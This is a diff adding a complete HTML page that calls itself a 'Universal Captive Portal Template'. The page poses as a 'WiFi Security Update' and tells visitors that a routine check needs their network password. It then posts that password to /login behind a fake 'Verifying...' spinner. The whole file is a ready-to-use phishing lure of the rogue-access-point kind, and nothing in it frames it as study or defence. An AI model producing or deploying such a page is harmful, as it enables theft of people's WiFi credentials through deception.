@@ -1,0 +1,166 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Universal Captive Portal Template -->
+<!-- No brand-specific logo - just generic "WiFi Security Update" -->
+
+<!DOCTYPE html>
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#0a84ff">
+<title>WiFi Network - Sign In</title>
+<style>
+* { box-sizing: border-box; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+  margin: 0; padding: 0; min-height: 100vh;
+  display: flex; align-items: center; justify-content: center;
+}
+.card {
+  background: white;
+  border-radius: 16px;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+  padding: 40px 30px;
+  max-width: 380px;
+  width: 90%;
+  text-align: center;
+}
+.icon {
+  width: 80px; height: 80px;
+  background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+  border-radius: 50%;
+  margin: 0 auto 20px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 40px;
+  color: white;
+  box-shadow: 0 8px 20px rgba(79, 172, 254, 0.4);
+}
+h1 {
+  font-size: 22px;
+  font-weight: 600;
+  color: #1a1a1a;
+  margin: 0 0 8px;
+}
+.subtitle {
+  color: #6b7280;
+  font-size: 14px;
+  margin: 0 0 24px;
+  line-height: 1.5;
+}
+.ssid-badge {
+  background: #f3f4f6;
+  border-radius: 8px;
+  padding: 12px 16px;
+  margin: 0 0 20px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.ssid-badge .label {
+  font-size: 12px;
+  color: #6b7280;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.ssid-badge .name {
+  font-size: 14px;
+  font-weight: 600;
+  color: #1a1a1a;
+}
+.field {
+  margin-bottom: 16px;
+  text-align: left;
+}
+label {
+  display: block;
+  font-size: 12px;
+  font-weight: 600;
+  color: #374151;
+  margin-bottom: 6px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+input[type=password] {
+  width: 100%;
+  padding: 14px 16px;
+  border: 2px solid #e5e7eb;
+  border-radius: 10px;
+  font-size: 15px;
+  transition: all 0.2s;
+  background: #fafafa;
+}
+input[type=password]:focus {
+  outline: none;
+  border-color: #4facfe;
+  background: white;
+}
+button {
+  width: 100%;
+  padding: 14px;
+  background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+  color: white;
+  border: none;
+  border-radius: 10px;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  margin-top: 8px;
+  box-shadow: 0 4px 12px rgba(79, 172, 254, 0.3);
+}
+button:hover { opacity: 0.9; }
+.note {
+  font-size: 11px;
+  color: #9ca3af;
+  margin-top: 16px;
+  line-height: 1.4;
+}
+.spinner {
+  display: inline-block;
+  width: 20px;
+  height: 20px;
+  border: 2px solid #e5e7eb;
+  border-top: 2px solid #4facfe;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+@keyframes spin { 0% {transform: rotate(0deg);} 100% {transform: rotate(360deg);} }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="icon">📶</div>
+  <h1>WiFi Security Update</h1>
+  <p class="subtitle">Your network requires authentication to continue browsing. This is a routine security check.</p>
+
+  <div class="ssid-badge">
+    <span class="label">Network</span>
+    <span class="name" id="ssid">WiFi Network</span>
+  </div>
+
+  <form method="POST" action="/login" id="loginForm">
+    <div class="field">
+      <label for="password">Network Password</label>
+      <input type="password" id="password" name="password" required autofocus
+             placeholder="Enter your WiFi password" autocomplete="off">
+    </div>
+    <button type="submit" id="submitBtn">Continue to Internet</button>
+  </form>
+
+  <p class="note">
+    🔒 This is a one-time security verification.<br>
+    Your connection will be restored automatically.
+  </p>
+</div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  var btn = document.getElementById('submitBtn');
+  btn.innerHTML = '<span class="spinner"></span> Verifying...';
+  btn.disabled = true;
+  setTimeout(function() {
+    document.getElementById('loginForm').submit();
+  }, 1500);
+});
+</script>
+</body></html>
